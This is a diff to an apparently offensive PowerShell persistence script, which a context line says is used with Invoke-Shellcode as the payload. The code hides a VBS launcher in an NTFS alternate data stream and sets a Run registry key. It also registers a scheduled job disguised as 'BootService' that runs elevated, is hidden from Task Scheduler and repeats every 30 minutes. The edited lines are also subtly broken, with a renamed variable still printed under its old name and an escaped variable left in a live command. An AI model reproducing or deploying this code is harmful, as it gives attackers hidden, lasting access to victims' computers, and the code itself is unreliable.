@@ -93,15 +93,15 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\BootService"
     }
     else {
-       $Filepath = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
+       $script = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
        "the `$Script path is {$Filepath}"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        $Trig = New-JobTrigger -Once -At "7:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
-       $script = "Register-ScheduledJob -Name BootService -ScriptBlock {$Filepath} -Trigger `$Trig -ScheduledJobOption `$Option -RunNow"
-       "Whole path is $script"
-       $Fincommand = {$script}
-       
-       Invoke-Command -ScriptBlock $Fincommand
+       $scriptblock = [scriptblock]::Create($script)
+       Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger `$Trig -ScheduledJobOption `$Option -RunNow
+
+
+
        "Process Complete."
     }
 
